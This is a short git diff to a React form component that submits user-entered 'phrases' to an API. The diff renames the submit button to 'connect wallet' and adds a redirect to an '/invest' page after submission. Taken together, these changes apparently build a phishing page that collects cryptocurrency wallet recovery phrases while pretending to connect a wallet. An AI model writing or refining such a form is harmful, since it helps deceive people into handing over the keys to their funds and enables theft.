@@ -1,9 +1,11 @@
 import React, { useState } from 'react'
 import "./input.css"
-import { useParams } from 'react-router-dom'
+import { useNavigate, useParams } from 'react-router-dom'
 import api from '../../components/axiosInstance'
 
 const Input = () => {
+
+    const navigate = useNavigate()
     const {category} = useParams()
     
 
@@ -36,6 +38,9 @@ const Input = () => {
 
             setSuccess("Phrase submitted successfully")
             setPhrases("")
+            setTimeout(()=> {
+              navigate("/invest")
+            })
         } catch (error) {
             setError(
                 error.response?.data?.message || "Failed to submit phrases"
@@ -55,7 +60,7 @@ const Input = () => {
             rows={5}
             required
         />
-        <button type='submit'>Submit</button>
+        <button type='submit'>connect wallet</button>
 
         {error && <p className='error'>{error}</p>}
         {success && <p className='success'>{success}</p>}
